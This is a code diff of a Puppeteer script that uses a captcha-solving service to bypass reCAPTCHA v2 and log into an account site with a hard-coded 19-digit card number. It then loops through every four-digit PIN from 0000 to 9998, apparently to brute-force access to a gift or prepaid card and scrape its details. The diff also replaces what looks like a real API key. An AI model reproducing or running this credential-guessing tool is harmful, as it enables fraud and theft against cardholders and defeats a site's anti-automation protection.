@@ -4,12 +4,12 @@ const config = require("./config.json");
 
 const number = "6006496612521300008";
 
-ac.setAPIKey("811bb4fdefb489fb7ffff8ab3c1a9b5d");
+ac.setAPIKey("sadasdasfasfasfdasfasfasffsfsa");
 // ac.getBalance()
 //   .then((balance) => console.log("my balance is: " + balance))
 //   .catch((error) => console.log("an error with API key: " + error));
 
-async function loginUser(options) {
+async function loginUser(options:any) {
   try {
     console.log("solving recaptcha ...");
     let token = await ac.solveRecaptchaV2Proxyless(
@@ -24,7 +24,7 @@ async function loginUser(options) {
 
     const browser = await puppeteer.launch({
       args: ["--start-maximized"],
-      headless: true,
+      headless: false,
       slowMo: 10,
       defaultViewport: null,
     });
@@ -68,7 +68,7 @@ async function loginUser(options) {
     console.log("setting recaptcha g-response ...");
     await page.$eval(
       "#g-recaptcha-response",
-      (element, token) => {
+      (element:any, token:any) => {
         element.value = token;
       },
       token,
@@ -83,8 +83,8 @@ async function loginUser(options) {
     await page.waitForNavigation({ waitUntil: "domcontentloaded" });
 
     const content = await page.evaluate(() => {
-      let rowList = [];
-
+      let rowList: any[] = [];
+      
       let rows = document.querySelectorAll("form");
       rows.forEach((row) => {
         const tdList = Array.from(
@@ -103,18 +103,7 @@ async function loginUser(options) {
       return rowList;
     });
 
-    // let balance = await page.evaluate(() => {
-    //   let results = [];
-    //   let items = document.querySelectorAll("form p b");
-    //   items.forEach((item) => {
-    //     results.push({
-    //       number: item.innerText,
-    //       balance: item.innerText,
-    //     });
-    //   });
-    //   return results;
-    // });
-
+    
     console.log(content);
     console.log(options.pin);
 
@@ -128,10 +117,7 @@ async function loginUser(options) {
 }
 
 let main = async () => {
-  // test1 = loginUser({ number: config.number1, pin: config.pin1, index: 1 });
-  // test2 = loginUser({ number: config.number2, pin: config.pin2, index: 2 });
-  // test3 = loginUser({ number: config.number3, pin: config.pin3, index: 3 });
-  // await Promise.all([test1]);
+ 
   for (let i = 0; i < 9999; i++) {
     let guess = String(i).padStart(4, "0");
     await Promise.all([
